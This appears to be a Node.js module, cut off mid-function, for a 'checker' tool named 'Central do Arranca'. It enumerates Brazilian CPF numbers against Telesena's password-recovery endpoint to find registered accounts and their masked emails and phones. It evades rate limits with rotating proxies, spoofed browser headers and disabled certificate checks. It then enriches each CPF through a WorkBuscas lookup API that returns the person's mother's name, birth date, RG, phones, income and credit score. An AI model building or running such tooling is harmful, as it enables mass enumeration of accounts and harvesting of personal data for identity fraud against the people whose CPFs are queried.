/**
 * Central do Arranca - Telesena Checker
 * Checker específico para a API Telesena
 * Faz requisições para verificar CPFs na API Telesena usando proxies da Webshare
 */

const axios = require('axios');
const https = require('https');
const fs = require('fs-extra');
const path = require('path');
const configLoader = require('../../config-loader');
const Logger = require('../../logger');
const RateLimiter = require('../../rate-limiter');
const metrics = require('../../metrics');

let HttpsProxyAgent;
try {
  HttpsProxyAgent = require('https-proxy-agent');
} catch (_) {
  HttpsProxyAgent = null;
}

let SocksProxyAgent;
try {
  SocksProxyAgent = require('socks-proxy-agent');
} catch (_) {
  SocksProxyAgent = null;
}

class TelesenaChecker {
  constructor(options = {}) {
    // Carrega configurações centralizadas
    this.config = configLoader.get('apis.telesena') || {};
    this.checkerConfig = configLoader.get('checkers.telesena') || {};
    this.proxyConfig = configLoader.get('proxies') || {};
    
    // Logger estruturado
    this.logger = new Logger('TELESENA');
    
    // Rate limiter
    this.rateLimiter = new RateLimiter('telesena');
    
    // Tokens via config loader (prioriza variáveis de ambiente)
    this.proxyApiToken = configLoader.getProxyToken();
    this.workbuscasToken = configLoader.getWorkBuscasToken();
    
    // URLs e configurações
    this.proxyApiUrl = this.proxyConfig.webshare?.apiUrl || 'https://proxy.webshare.io/api/v2/proxy/list/';
    this.apiBaseUrl = this.config.baseUrl || 'https://api.telesena.com.br/api/v2/customer/password-recovery/options';
    this.workbuscasUrl = configLoader.get('apis.workbuscas.baseUrl') || 'https://completa.workbuscas.com/api';
    
    // Configuração do proxy rotate (SOCKS5)
    this.rotateConfig = this.proxyConfig.webshare?.rotate || {};
    this.useRotate = this.rotateConfig.enabled === true;
    
    this.proxies = [];
    this.results = [];
    this.successCount = 0;
    this.errorCount = 0;
    this.registeredCount = 0;
    this.unregisteredCount = 0;
    
    // Configurações do config.json com fallback
    this.batchSize = this.checkerConfig.batchSize || 20;
    this.delay = this.checkerConfig.delay || 2000;
    this.timeout = this.config.timeout || this.checkerConfig.timeout || 10000;
    this.useForeignOnly = !!options.useForeignOnly;
    
    // Cache de proxies - módulo Telesena
    const cacheConfig = configLoader.get('cache') || {};
    this.cacheDir = path.join(__dirname, '../../', cacheConfig.baseDir || '.cache');
    this.cacheFile = path.join(this.cacheDir, cacheConfig.proxies?.telesena || 'proxies-telesena.json');
    this.cacheExpiry = (this.proxyConfig.webshare?.cacheExpiryHours || 24) * 60 * 60 * 1000;
  }

  /**
   * Cria configurações SSL padrão para requisições
   */
  getSSLConfig() {
    const sslConfig = configLoader.get('security.ssl') || {
      rejectUnauthorized: false,
      secureProtocol: 'TLSv1_2_method'
    };
    
    return {
      httpsAgent: new https.Agent({
        rejectUnauthorized: sslConfig.rejectUnauthorized,
        secureProtocol: sslConfig.secureProtocol || 'TLSv1_2_method'
      }),
      proxy: false,
      maxRedirects: 5,
      validateStatus: function (status) {
        return status >= 200 && status < 300;
      }
    };
  }

  /**
   * Gera um User-Agent aleatório de navegador real
   */
  getRandomUserAgent() {
    const userAgents = [
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
      'Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0',
      'Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0',
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 Edg/119.0.0.0'
    ];
    return userAgents[Math.floor(Math.random() * userAgents.length)];
  }

  /**
   * Verifica se o cache de proxies é válido
   */
  isCacheValid() {
    try {
      if (!fs.existsSync(this.cacheFile)) {
        return false;
      }
      
      const stats = fs.statSync(this.cacheFile);
      const now = Date.now();
      const cacheAge = now - stats.mtime.getTime();
      
      return cacheAge < this.cacheExpiry;
    } catch (error) {
      return false;
    }
  }

  /**
   * Carrega proxies do cache
   */
  loadFromCache() {
    try {
      const cacheData = fs.readJsonSync(this.cacheFile);
      this.proxies = cacheData.proxies || [];
      console.log(`📦 ${this.proxies.length} proxies carregados do cache`);
      return this.proxies;
    } catch (error) {
      console.log('❌ Erro ao carregar cache:', error.message);
      return [];
    }
  }

  /**
   * Salva proxies no cache
   */
  async saveToCache(proxies) {
    try {
      await fs.ensureDir(this.cacheDir);
      const cacheData = {
        proxies: proxies,
        timestamp: Date.now(),
        count: proxies.length
      };
      await fs.writeJson(this.cacheFile, cacheData, { spaces: 2 });
      console.log(`💾 ${proxies.length} proxies salvos no cache`);
    } catch (error) {
      console.log('❌ Erro ao salvar cache:', error.message);
    }
  }

  /**
   * Carrega proxies da API Webshare
   */
  async loadProxies(progressCallback) {
    // Verifica cache primeiro
    if (this.isCacheValid()) {
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        this.proxies = cachedProxies;
        if (progressCallback) {
          progressCallback(cachedProxies.length);
          setTimeout(() => {
            if (progressCallback) {
              progressCallback(1000);
            }
          }, 100);
        }
        return this.proxies;
      }
    }
    
    console.log('🔄 Carregando proxies da Webshare...');
    
    try {
      const allProxies = [];
      let page = 1;
      const pageSize = 25;
      let retryCount = 0;
      const maxRetries = 3;
      
      while (true) {
        try {
          const response = await axios.get(this.proxyApiUrl, {
            params: {
              mode: 'direct',
              page: page,
              page_size: pageSize
            },
            headers: {
              'Authorization': `Token ${this.proxyApiToken}`
            },
            timeout: 10000,
            ...this.getSSLConfig()
          });
          
          const proxies = response.data.results || [];
          if (proxies.length === 0) break;
          
          allProxies.push(...proxies);
          
          if (progressCallback) {
            progressCallback(allProxies.length);
          }
          
          page++;
          retryCount = 0; // Reset retry count on success
          
          if (allProxies.length >= 1000) break;
          await new Promise(resolve => setTimeout(resolve, 200));
          
        } catch (error) {
          // Trata rate limit (429)
          if (error.response && error.response.status === 429) {
            const retryAfter = parseInt(error.response.headers['retry-after'] || '5');
            
            // Se já tem alguns proxies carregados, para e usa eles (não espera muito)
            if (allProxies.length >= 100) {
              console.log(`⚠️ [Telesena] Rate limit (429). Já tem ${allProxies.length} proxies, usando esses e parando aqui.`);
              break; // Usa o que já tem
            }
            
            // Se der rate limit na primeira página, tenta usar cache imediatamente
            if (page === 1 && allProxies.length === 0) {
              console.log(`⚠️ [Telesena] Rate limit (429) na primeira página. Tentando usar cache ou compartilhar proxies...`);
              
              // Tenta cache próprio primeiro
              const cachedProxies = this.loadFromCache();
              if (cachedProxies.length > 0) {
                console.log(`📦 [Telesena] Usando ${cachedProxies.length} proxies do cache (rate limit detectado)`);
                this.proxies = cachedProxies;
                if (progressCallback) {
                  progressCallback(cachedProxies.length);
                }
                return this.proxies;
              }
              
              // Tenta compartilhar proxies do Gemeos ou Saúde (se disponíveis)
              const gemeosCacheFile = path.join(this.cacheDir, 'proxies-gemeos.json');
              const saudeCacheFile = path.join(this.cacheDir, 'proxies-saude.json');
              
              if (fs.existsSync(gemeosCacheFile)) {
                try {
                  const gemeosCache = fs.readJsonSync(gemeosCacheFile);
                  if (gemeosCache.proxies && gemeosCache.proxies.length > 0) {
                    console.log(`📦 [Telesena] Compartilhando ${gemeosCache.proxies.length} proxies do Gemeos (rate limit detectado)`);
                    this.proxies = gemeosCache.proxies;
                    if (progressCallback) {
                      progressCallback(gemeosCache.proxies.length);
                    }
                    return this.proxies;
                  }
                } catch (e) {
                  // Ignora erro ao ler cache do Gemeos
                }
              }
              
              if (fs.existsSync(saudeCacheFile)) {
                try {
                  const saudeCache = fs.readJsonSync(saudeCacheFile);
                  if (saudeCache.proxies && saudeCache.proxies.length > 0) {
                    console.log(`📦 [Telesena] Compartilhando ${saudeCache.proxies.length} proxies do Saúde (rate limit detectado)`);
                    this.proxies = saudeCache.proxies;
                    if (progressCallback) {
                      progressCallback(saudeCache.proxies.length);
                    }
                    return this.proxies;
                  }
                } catch (e) {
                  // Ignora erro ao ler cache do Saúde
                }
              }
            }
            
            if (retryCount < maxRetries) {
              retryCount++;
              console.log(`⚠️ [Telesena] Rate limit (429). Aguardando ${retryAfter}s antes de tentar novamente... (tentativa ${retryCount}/${maxRetries})`);
              
              await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
              continue; // Tenta novamente a mesma página
            } else {
              console.log(`❌ [Telesena] Rate limit persistente após ${maxRetries} tentativas. Usando proxies já carregados ou cache: ${allProxies.length}`);
              // Tenta cache como último recurso
              if (allProxies.length === 0) {
                const cachedProxies = this.loadFromCache();
                if (cachedProxies.length > 0) {
                  console.log(`📦 [Telesena] Usando ${cachedProxies.length} proxies do cache após ${maxRetries} tentativas falhadas`);
                  this.proxies = cachedProxies;
                  if (progressCallback) {
                    progressCallback(cachedProxies.length);
                  }
                  return this.proxies;
                }
              }
              break; // Para e usa o que já tem (mesmo se for 0)
            }
          } else {
            // Outro erro - propaga
            throw error;
          }
        }
      }
      
      // Se não conseguiu carregar pelo menos alguns proxies, tenta cache compartilhado
      if (allProxies.length === 0) {
        console.log('⚠️ [Telesena] Nenhum proxy carregado da API. Tentando usar cache compartilhado...');
        
        // Tenta cache próprio primeiro
        const cachedProxies = this.loadFromCache();
        if (cachedProxies.length > 0) {
          console.log(`📦 [Telesena] Usando ${cachedProxies.length} proxies do cache próprio`);
          this.proxies = cachedProxies;
          if (progressCallback) {
            progressCallback(cachedProxies.length);
          }
          return this.proxies;
        }
        
        // Tenta compartilhar proxies do Gemeos ou Saúde
        const gemeosCacheFile = path.join(this.cacheDir, 'proxies-gemeos.json');
        const saudeCacheFile = path.join(this.cacheDir, 'proxies-saude.json');
        
        if (fs.existsSync(gemeosCacheFile)) {
          try {
            const gemeosCache = fs.readJsonSync(gemeosCacheFile);
            if (gemeosCache.proxies && gemeosCache.proxies.length > 0) {
              console.log(`📦 [Telesena] Compartilhando ${gemeosCache.proxies.length} proxies do Gemeos`);
              this.proxies = gemeosCache.proxies;
              if (progressCallback) {
                progressCallback(gemeosCache.proxies.length);
              }
              return this.proxies;
            }
          } catch (e) {
            // Ignora erro
          }
        }
        
        if (fs.existsSync(saudeCacheFile)) {
          try {
            const saudeCache = fs.readJsonSync(saudeCacheFile);
            if (saudeCache.proxies && saudeCache.proxies.length > 0) {
              console.log(`📦 [Telesena] Compartilhando ${saudeCache.proxies.length} proxies do Saúde`);
              this.proxies = saudeCache.proxies;
              if (progressCallback) {
                progressCallback(saudeCache.proxies.length);
              }
              return this.proxies;
            }
          } catch (e) {
            // Ignora erro
          }
        }
      }
      
      this.proxies = allProxies.slice(0, 1000);
      
      // Verifica se deve pular teste
      const skipTestConfig = configLoader.get('proxies.skipTestOnLoad');
      const skipTestEnv = process.env.SKIP_PROXY_TEST === 'true';
      const skipProxyTest = skipTestConfig === true || skipTestEnv === true;
      
      if (skipProxyTest) {
        console.log('⚡ [Telesena] Teste de proxies PULADO na inicialização');
        if (progressCallback) {
          progressCallback(1000);
        }
        await this.saveToCache(this.proxies);
        return this.proxies;
      }
      
      if (progressCallback) {
        progressCallback(1000);
      }
      
      await this.saveToCache(this.proxies);
      
      return this.proxies;
      
    } catch (error) {
      console.log('❌ [Telesena] Erro ao carregar proxies:', error.message);
      
      // Tenta cache próprio primeiro
      const cachedProxies = this.loadFromCache();
      if (cachedProxies.length > 0) {
        console.log('📦 [Telesena] Usando cache expirado como fallback');
        this.proxies = cachedProxies;
        if (progressCallback) {
          progressCallback(cachedProxies.length);
        }
        return this.proxies;
      }
      
      // Se não tem cache próprio, tenta compartilhar dos outros módulos
      const gemeosCacheFile = path.join(this.cacheDir, 'proxies-gemeos.json');
      const saudeCacheFile = path.join(this.cacheDir, 'proxies-saude.json');
      
      if (fs.existsSync(gemeosCacheFile)) {
        try {
          const gemeosCache = fs.readJsonSync(gemeosCacheFile);
          if (gemeosCache.proxies && gemeosCache.proxies.length > 0) {
            console.log(`📦 [Telesena] Usando ${gemeosCache.proxies.length} proxies do Gemeos como fallback`);
            this.proxies = gemeosCache.proxies;
            if (progressCallback) {
              progressCallback(gemeosCache.proxies.length);
            }
            return this.proxies;
          }
        } catch (e) {
          // Ignora erro
        }
      }
      
      if (fs.existsSync(saudeCacheFile)) {
        try {
          const saudeCache = fs.readJsonSync(saudeCacheFile);
          if (saudeCache.proxies && saudeCache.proxies.length > 0) {
            console.log(`📦 [Telesena] Usando ${saudeCache.proxies.length} proxies do Saúde como fallback`);
            this.proxies = saudeCache.proxies;
            if (progressCallback) {
              progressCallback(saudeCache.proxies.length);
            }
            return this.proxies;
          }
        } catch (e) {
          // Ignora erro
        }
      }
      
      // Se não conseguiu nenhum proxy, permite continuar sem proxies (pode funcionar sem)
      console.log('⚠️ [Telesena] Nenhum proxy disponível. Continuando sem proxies...');
      this.proxies = [];
      if (progressCallback) {
        progressCallback(0);
      }
      return this.proxies;
    }
  }

  /**
   * Obtém um proxy aleatório
   * Se rotate estiver habilitado, retorna o proxy rotate primeiro
   */
  getRandomProxy() {
    // Se usar rotate, retorna proxy rotate do Webshare
    if (this.useRotate && this.rotateConfig.username && this.rotateConfig.password) {
      return {
        host: this.rotateConfig.host || 'p.webshare.io',
        port: this.rotateConfig.port || 80,
        protocol: this.rotateConfig.protocol || 'socks5',
        tryHttp: true, // Tenta HTTP se SOCKS5 falhar
        auth: {
          username: this.rotateConfig.username,
          password: this.rotateConfig.password
        },
        isRotate: true
      };
    }
    
    if (this.proxies.length === 0) {
      return null;
    }
    
    const proxy = this.proxies[Math.floor(Math.random() * this.proxies.length)];
    return {
      host: proxy.proxy_address,
      port: proxy.port,
      auth: proxy.username && proxy.password ? {
        username: proxy.username,
        password: proxy.password
      } : undefined,
      isRotate: false
    };
  }

  /**
   * Faz requisição para a API (com ou sem proxy)
   */
  async makeAPIRequest(cpf, proxy) {
    const startTime = Date.now();
    
    try {
      // Verifica rate limit antes de fazer requisição
      // IMPORTANTE: Se estiver usando proxy, o rate limiter é menos restritivo
      // (cada proxy tem seu próprio IP, então não precisa limitar tanto)
      let rateLimitCheck = this.rateLimiter.canMakeRequest();
      
      // Se está usando proxy, só verifica rate limit se realmente estiver bloqueado pela API
      // (não bloqueia preventivamente quando usa proxy)
      if (proxy && rateLimitCheck.allowed) {
        // Com proxy, apenas registra a requisição sem bloquear preventivamente
        this.rateLimiter.recordRequest();
      } else if (!proxy) {
        // Sem proxy, verifica rate limit preventivamente
        let waitCount = 0;
        const maxWaitIterations = 100; // Evita loop infinito
        
        while (!rateLimitCheck.allowed && waitCount < maxWaitIterations) {
          waitCount++;
          if (rateLimitCheck.waitSeconds && rateLimitCheck.waitSeconds > 0) {
            const waitTime = Math.min(rateLimitCheck.waitSeconds * 1000, 5000);
            await new Promise(resolve => setTimeout(resolve, waitTime));
          } else {
            await new Promise(resolve => setTimeout(resolve, 1000));
          }
          rateLimitCheck = this.rateLimiter.canMakeRequest();
        }
        
        // Registra a requisição ANTES de fazer (importante para evitar múltiplas simultâneas)
        this.rateLimiter.recordRequest();
      } else {
        // Com proxy mas rate limit ativo - apenas registra (não bloqueia preventivamente)
        this.rateLimiter.recordRequest();
      }
      
      // Remove formatação do CPF (apenas números)
      const cpfClean = cpf.replace(/\D/g, '');
      const url = `${this.apiBaseUrl}/${cpfClean}`;
      
      const axiosConfig = {
        method: 'get',
        url: url,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'accept': 'application/json, text/plain, */*',
          'accept-encoding': 'gzip, deflate, br, zstd',
          'accept-language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
          'origin': 'https://www.telesena.com.br',
          'referer': 'https://www.telesena.com.br/'
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          // Aceita status 200-499 (incluindo 404 que pode indicar não cadastrado)
          return status >= 200 && status < 500;
        }
      };
      
      if (proxy) {
        // Se for proxy rotate
        if (proxy.isRotate) {
          const authPart = proxy.auth && proxy.auth.username && proxy.auth.password
            ? `${encodeURIComponent(proxy.auth.username)}:${encodeURIComponent(proxy.auth.password)}@`
            : '';
          
          // Tenta SOCKS5 primeiro se configurado
          if (proxy.protocol === 'socks5' && SocksProxyAgent) {
            const proxyUrl = `socks5://${authPart}${proxy.host}:${proxy.port}`;
            axiosConfig.proxy = false;
            // socks-proxy-agent exporta como objeto com propriedade SocksProxyAgent
            const SocksAgent = SocksProxyAgent.SocksProxyAgent || SocksProxyAgent.default || SocksProxyAgent;
            try {
              if (typeof SocksAgent !== 'function') {
                throw new Error('SocksProxyAgent não é um construtor válido');
              }
              axiosConfig.httpsAgent = new SocksAgent(proxyUrl);
              axiosConfig.httpAgent = new SocksAgent(proxyUrl);
              console.log(`[Telesena] 🔄 Usando proxy rotate SOCKS5: ${proxy.host}:${proxy.port}`);
            } catch (socksError) {
              console.error(`[Telesena] ❌ Erro ao configurar proxy SOCKS5:`, socksError.message);
              // Se falhar SOCKS5 e tryHttp estiver ativo, tenta HTTP
              if (proxy.tryHttp && HttpsProxyAgent) {
                console.log(`[Telesena] ⚠️ SOCKS5 falhou, tentando HTTP...`);
                const httpProxyUrl = `http://${authPart}${proxy.host}:${proxy.port}`;
                axiosConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(httpProxyUrl);
                console.log(`[Telesena] 🔄 Usando proxy rotate HTTP: ${proxy.host}:${proxy.port}`);
              } else {
                throw new Error(`Erro ao configurar proxy SOCKS5: ${socksError.message}`);
              }
            }
          } else if (HttpsProxyAgent) {
            // Usa HTTP diretamente se não for SOCKS5
            const httpProxyUrl = `http://${authPart}${proxy.host}:${proxy.port}`;
            axiosConfig.proxy = false;
            axiosConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(httpProxyUrl);
            console.log(`[Telesena] 🔄 Usando proxy rotate HTTP: ${proxy.host}:${proxy.port}`);
          } else {
            // Fallback para objeto proxy
            axiosConfig.proxy = {
              host: proxy.host,
              port: proxy.port,
              auth: proxy.auth,
              protocol: 'http'
            };
            console.log(`[Telesena] 🔄 Usando proxy rotate (fallback): ${proxy.host}:${proxy.port}`);
          }
        } else if (HttpsProxyAgent) {
          // Proxy HTTP normal
          const authPart = proxy.auth && proxy.auth.username && proxy.auth.password
            ? `${encodeURIComponent(proxy.auth.username)}:${encodeURIComponent(proxy.auth.password)}@`
            : '';
          const proxyUrl = `http://${authPart}${proxy.host}:${proxy.port}`;
          axiosConfig.proxy = false;
          axiosConfig.httpsAgent = new HttpsProxyAgent.HttpsProxyAgent(proxyUrl);
        } else {
          axiosConfig.proxy = {
            host: proxy.host,
            port: proxy.port,
            auth: proxy.auth,
            protocol: 'http'
          };
        }
      }
      
      const response = await axios(axiosConfig);
      
      // Normaliza resposta
      const contentType = (response.headers && (response.headers['content-type'] || response.headers['Content-Type'])) || '';
      if (typeof response.data === 'string') {
        const trimmed = response.data.trim();
        if ((trimmed.startsWith('{') && trimmed.endsWith('}')) || (trimmed.startsWith('[') && trimmed.endsWith(']'))) {
          try {
            response.data = JSON.parse(trimmed);
          } catch (_) {
            // continua
          }
        }
      }
      
      // Tratamento de rate limit
      if (response.status === 429) {
        const duration = Date.now() - startTime;
        await this.rateLimiter.handleRateLimit(duration);
        
        metrics.recordRequest('telesena', false, duration, 429);
        await this.logger.warn('Rate limit detectado na API', {
          cpf,
          status: response.status,
          proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
          duration
        });
        
        return {
          cpf: cpf,
          success: false,
          error: 'rate_limited',
          status: response.status,
          proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
        };
      }

      const dataIsObject = typeof response.data === 'object' && response.data !== null;
      
      const result = {
        cpf: cpf,
        success: true,
        status: response.status,
        data: response.data,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
      };

      // Interpretação do retorno da nova API Telesena
      // Retorna: {"email":"f***@hotmail.com","fone":"6935"}
      // Se retornar email ou fone = CPF cadastrado
      // Se retornar 404 ou sem dados = CPF não cadastrado
      try {
        const payload = response.data;
        
        // Verifica se tem dados válidos (email ou fone)
        const hasEmail = payload && (payload.email || payload.emailMascarado);
        const hasFone = payload && (payload.fone || payload.finalTelefone || payload.telefone);
        
        if (hasEmail || hasFone) {
          // Tem dados válidos = CPF cadastrado
          this.registeredCount++;
          result.interpretation = 'registered';
          result.message = 'Cadastrado';
          // Extrai email (aceita tanto 'email' quanto 'emailMascarado' para compatibilidade)
          result.emailMascarado = payload.email || payload.emailMascarado || null;
          // Extrai fone (aceita 'fone', 'finalTelefone' ou 'telefone')
          result.finalTelefone = payload.fone || payload.finalTelefone || payload.telefone || null;
        } else {
          // Sem dados válidos = não cadastrado
          this.unregisteredCount++;
          result.interpretation = 'not_registered';
          result.message = 'Não cadastrado';
        }
      } catch (_) {
        // Fallback conservador - se não conseguiu parsear, assume não cadastrado
        this.unregisteredCount++;
        result.interpretation = 'not_registered';
        result.message = 'Erro ao interpretar resposta';
      }

      result.timestamp = new Date().toISOString();

      this.successCount++;
      
      const duration = Date.now() - startTime;
      this.rateLimiter.recordSuccess();
      metrics.recordRequest('telesena', true, duration, result.status);
      
      await this.logger.debug('CPF verificado', {
        cpf,
        interpretation: result.interpretation,
        status: result.status,
        duration,
        proxy: result.proxy
      });
      
      return result;

    } catch (error) {
      const duration = Date.now() - startTime;
      
      if (error.response?.status === 429) {
        await this.rateLimiter.handleRateLimit(duration);
        metrics.recordRequest('telesena', false, duration, 429);
        await this.logger.warn('Rate limit (429) na requisição', {
          cpf,
          duration,
          proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
        });
      } else {
        metrics.recordRequest('telesena', false, duration, error.response?.status || 0);
        await this.logger.error('Erro ao fazer requisição', {
          cpf,
          error: error.message,
          status: error.response?.status || 0,
          duration,
          proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
        });
      }
      
      if (error.response && error.response.status === 404) {
        // 404 = CPF não cadastrado na API Telesena
        const result = {
          cpf: cpf,
          success: true,
          status: 404,
          data: null,
          proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
          interpretation: 'not_registered',
          message: 'CPF não cadastrado',
          timestamp: new Date().toISOString()
        };
        this.unregisteredCount++;
        this.successCount++;
        return result;
      }
      
      // Se a resposta de erro tem status 200 mas com mensagem de não cadastrado
      if (error.response && error.response.status === 200 && error.response.data) {
        try {
          const errorData = typeof error.response.data === 'string' 
            ? JSON.parse(error.response.data) 
            : error.response.data;
          
          if (errorData.status === 'SUCCESS' && errorData.message && 
              (errorData.message.toLowerCase().includes('não cadastrado') || 
               errorData.message.toLowerCase().includes('nao cadastrado'))) {
            const result = {
              cpf: cpf,
              success: true,
              status: 200,
              data: errorData,
              proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy',
              interpretation: 'not_registered',
              message: errorData.message,
              timestamp: new Date().toISOString()
            };
            this.unregisteredCount++;
            this.successCount++;
            return result;
          }
        } catch (_) {
          // Ignora erro ao parsear resposta de erro
        }
      }
      
      this.errorCount++;
      return {
        cpf: cpf,
        success: false,
        error: error.message,
        status: error.response?.status || 0,
        proxy: proxy ? `${proxy.host}:${proxy.port}` : 'Sem Proxy'
      };
    }
  }

  /**
   * Consulta dados complementares na API WorkBuscas
   * Retorna: nome completo, nome da mãe, data de nascimento, telefone, RG e email
   */
  async consultWorkBuscas(cpf) {
    try {
      const url = `${this.workbuscasUrl}?token=${this.workbuscasToken}&modulo=cpf&consulta=${cpf}`;
      
      const axiosConfig = {
        method: 'get',
        url: url,
        headers: {
          'Content-Type': 'application/json',
          'User-Agent': this.getRandomUserAgent(),
          'accept': 'application/json',
        },
        timeout: this.timeout,
        ...this.getSSLConfig(),
        validateStatus: function (status) {
          return status >= 200 && status < 500;
        }
      };

      const response = await axios(axiosConfig);
      
      if (response.status !== 200 || !response.data) {
        return null;
      }

      const data = response.data;
      
      // Extrai os dados solicitados
      const workbuscasData = {
        nome: null,
        telefone: null,
        telefones: [], // Array com todos os telefones
        email: null,
        nomeMae: null,
        dataNascimento: null,
        rg: null,
        rgDataEmissao: null,
        rgOrgaoEmissor: null,
        rgUfEmissao: null,
        renda: null,
        score: null
      };

      // Nome completo (DadosBasicos ou campo direto)
      if (data.DadosBasicos && data.DadosBasicos.nome) {
        workbuscasData.nome = data.DadosBasicos.nome;
      } else if (data.nome) {
        workbuscasData.nome = data.nome;
      }

      // Telefones (pega todos os telefones disponíveis)
      if (data.telefones && Array.isArray(data.telefones) && data.telefones.length > 0) {
        workbuscasData.telefones = data.telefones.map(t => ({
          numero: t.telefone || t.numero || null,
          operadora: t.operadora || null,
          tipo: t.tipo || null,
          status: t.status || null,
          whatsapp: t.whatsapp || null
        })).filter(t => t.numero !== null);
        
        // Mantém compatibilidade: primeiro telefone como telefone principal
        if (workbuscasData.telefones.length > 0) {
          workbuscasData.telefone = workbuscasData.telefones[0].numero;
        }
      } else if (data.telefone) {
        workbuscasData.telefone = data.telefone;
        workbuscasData.telefones = [{ numero: data.telefone }];
      }

      // Email (pega o primeiro disponível)
      if (data.emails && Array.isArray(data.emails) && data.emails.length > 0) {
        workbuscasData.email = data.emails[0].email || null;
      } else if (data.email) {
        workbuscasData.email = data.email;
      }

      // Nome da mãe e data de nascimento (DadosBasicos)
      if (data.DadosBasicos) {
        if (data.DadosBasicos.nomeMae) {
          workbuscasData.nomeMae = data.DadosBasicos.nomeMae;
        }
        if (data.DadosBasicos.dataNascimento) {
          workbuscasData.dataNascimento = data.DadosBasicos.dataNascimento;
        }
      }

      // Renda e Score (DadosEconomicos)
      if (data.DadosEconomicos) {
        if (data.DadosEconomicos.renda) {
          workbuscasData.renda = data.DadosEconomicos.renda;
        }
        if (data.DadosEconomicos.score?.scoreCSB) {
          workbuscasData.score = data.DadosEconomicos.score.scoreCSB;
        }
      }

      // RG (Registro Geral)
      if (data.registroGeral && typeof data.registroGeral === 'object' && data.registroGeral !== null) {
        if (data.registroGeral.rgNumero) {
          workbuscasData.rg = data.registroGeral.rgNumero;
        }
        if (data.registroGeral.dataEmissao) {
          workbuscasData.rgDataEmissao = data.registroGeral.dataEmissao;
        }
        if (data.registroGeral.orgaoEmissor) {
          workbuscasData.rgOrgaoEmissor = data.registroGeral.orgaoEmissor;
        }
        if (data.registroGeral.ufEmissao) {
          workbuscasData.rgUfEmissao = data.registroGeral.ufEmissao;
        }
      }

      // Tenta campos diretos também
      if (!workbuscasData.nomeMae && data.nomeMae) {
        workbuscasData.nomeMae = data.nomeMae;
      }
      if (!workbuscasData.dataNascimento && data.dataNascimento) {
        workbuscasData.dataNascimento = data.dataNascimento;
      }
      if (!workbuscasData.rg && data.rg) {
        workbuscasData.rg = data.rg;
      }
      if (!workbuscasData.rg && data.rgNumero) {
        workbuscasData.rg = data.rgNumero;
      }

      // Verifica se pelo menos um dado foi extraído
      const hasData = Object.values(workbuscasData).some(v => {
        if (Array.isArray(v)) return v.length > 0;
        return v !== null && v !== undefined && v !== '';
      });
      
      if (!hasData) {
        console.warn(`[Telesena] Nenhum dado do WorkBuscas extraído para CPF ${cpf}`);
        return null;
      }
      
      return workbuscasData;
    } catch (error) {
      // Em caso de erro, retorna null silenciosamente (não é crítico)
      console.warn(`[Telesena] Erro ao consultar WorkBuscas para CPF ${cpf}:`, error.message);
      return null;
    }
  }

  /**
   * Verifica um único CPF na API com fallback inteligente
   */
  async checkCPF(cpf, showProxyInfo = false) {
    const startTime = Date.now();
    
    try {
      let attempts = 0;
      let lastError = null;
      let usedProxy = null;
      let result = null;

      // Tenta com proxies (até 5)
      while (attempts < 5) {
        usedProxy = this.getRandomProxy();
        result = await this.makeAPIRequest(cpf, usedProxy);
        if (result.success) break;

        const err = String(result.error || '');
        const isTimeout = /timeout|ETIMEDOUT|ECONNABORTED|Network/i.test(err);
        const isUnknown = /unknown_response|non_json|html/i.test(err);
        const isRateLimited = /rate_limited/i.test(err) || result.status === 429;
        const isNetworkStatus = !result.status || result.status === 0;

        // Remove proxy problemática (só se não for rotate)
        if (usedProxy && !usedProxy.isRotate && (isTimeout || isUnknown || isRateLimited || isNetworkStatus)) {
